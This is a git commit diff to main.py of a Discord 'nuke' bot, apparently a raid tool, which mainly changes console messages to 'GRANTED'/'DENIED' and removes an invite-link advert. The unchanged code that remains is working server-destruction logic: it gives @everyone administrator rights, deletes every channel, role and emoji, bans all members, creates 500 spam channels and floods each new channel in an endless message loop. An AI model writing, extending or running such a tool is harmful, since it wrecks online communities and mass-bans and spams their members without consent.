efa9b1127f641d1cca0c0b6a6daf326307bbd696
nKisee <90967331+iamZargo@users.noreply.github.com>
2022-04-04 15:26:49 +0800

    Console Update
    Console is now much better.
    
    Access and Denied is now added. It's to identify if the bot and the command is working.

--- main.py
+++ main.py
@@ -1,22 +1,8 @@
 import discord
 from discord.ext import commands
-import random
 from discord import Permissions
 from colorama import Fore, Style
-import asyncio
-import subprocess
-import os
 from os import system
-import colorama
-from colorama import init, Fore, Back, Style
-import discord
-from discord.ext import commands
-import requests
-import time
-import colorama 
-from colorama import Fore
-import requests, os, threading, discord, time
-from colorama import Fore
 from colored import fg, attr
 from discord.ext import commands
 from pypresence import Presence
@@ -30,7 +16,6 @@ df_yellow = fg('#ccc900')
 token = input("Token: ")
 spam_channel_name = input("Spam Channel Name: ")
 spam_message_text = input("Spam Message Text: ")
-locked_serverlink = "https://discord.gg/MCZKVXjHv6"
 
 role_name = input("Role Name: ")
 
@@ -46,6 +31,7 @@ async def on_ready():
 {font_color}             ✡ | Client       : {granted}{client.user.name}
 {font_color}             ✡ | Author       : $$#5215 
 {font_color}             ✡ | Server       : Noxious
+{font_color}             ✡ | Link         : .gg/MCZKVXjHv6
 {font_color}        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {df_color}{df_color}[+]{df_yellow}{df_yellow} Start: ",nuke" ; Stop: ",stop"
 {df_color}{df_color}[+]{df_yellow}{df_yellow} Follow me on {df_color}TWT: @KiseeIsHere
@@ -56,10 +42,9 @@ async def on_ready():
 @client.command()
 @commands.is_owner()
 async def stop(ctx):
+    await ctx.message.delete()
     await ctx.bot.logout()
-    print (Fore.GREEN + f"{df_color}[+]{df_yellow} {client.user.name} has logged out successfully." + Fore.RESET)
-
-
+    print(Fore.GREEN + f"{df_color}[+]{df_yellow} {client.user.name} has logged out successfully." + Fore.RESET)
 
 @client.command()
 async def nuke(ctx):
@@ -68,38 +53,35 @@ async def nuke(ctx):
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
-      print(f"{df_color}[+]{df_yellow} {granted}everyone admin." + Fore.RESET)
+      print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Admin  | everyone" + Fore.RESET)
     except:
-      print(f"{df_color}[+]{df_yellow} {denied} everyone admin" + Fore.RESET)
+      print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Admin  | everyone" + Fore.RESET)
     for channel in guild.channels:
       try:
         await channel.delete()
-        print(f"{df_color}[+]{df_yellow} {channel.name} DELETED" + Fore.RESET)
+        print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Delete | {channel.name}" + Fore.RESET)
       except:
-        print(f"{df_color}[+]{df_yellow} {channel.name} NOT DELETED" + Fore.RESET)
+        print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Delete | {channel.name}" + Fore.RESET)
     for member in guild.members:
      try:
        await member.ban()
-       print(f"{df_color}[+]{df_yellow} {member.name}#{member.discriminator} BANNED" + Fore.RESET)
+       print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Banned | {member.name}#{member.discriminator}" + Fore.RESET)
      except:
-       print(f"{df_color}[+]{df_yellow} {member.name}#{member.discriminator} NOT BANNED" + Fore.RESET)
+       print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Banned | {member.name}#{member.discriminator}" + Fore.RESET)
     for role in guild.roles:
      try:
        await role.delete()
-       print(f"{df_color}[+]{df_yellow} {role.name} DELETED" + Fore.RESET)
+       print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Delete | {role.name}" + Fore.RESET)
      except:
-       print(f"{df_color}[+]{df_yellow} {role.name} NOT DELETED" + Fore.RESET)
+       print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Delete | {role.name}" + Fore.RESET)
     for emoji in list(ctx.guild.emojis):
      try:
        await emoji.delete()
-       print(f"{df_color}[+]{df_yellow} {emoji.name} DELETED" + Fore.RESET)
+       print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Delete | {emoji.name}" + Fore.RESET)
      except:
-       print(f"{df_color}[+]{df_yellow} {emoji.name} NOT DELETED" + Fore.RESET)
+       print(f"{df_color}[+]{denied} DENIED {df_yellow}| Delete | {emoji.name}" + Fore.RESET)
 
     await guild.create_text_channel(spam_channel_name)
-    for channel in guild.text_channels:
-        link = await channel.create_invite(max_age = 0, max_uses = 0)
-        print(f"{df_color}[+]{df_yellow} Join {locked_serverlink}")
     amount = 500
     for i in range(amount):
        await guild.create_text_channel(spam_channel_name)
@@ -114,6 +96,6 @@ async def nuke(ctx):
 @client.event
 async def on_guild_channel_create(channel):
   while True:
-    await channel.send(spam_message_text + locked_serverlink)
+    await channel.send(spam_message_text)
 
 client.run(token, bot=True)
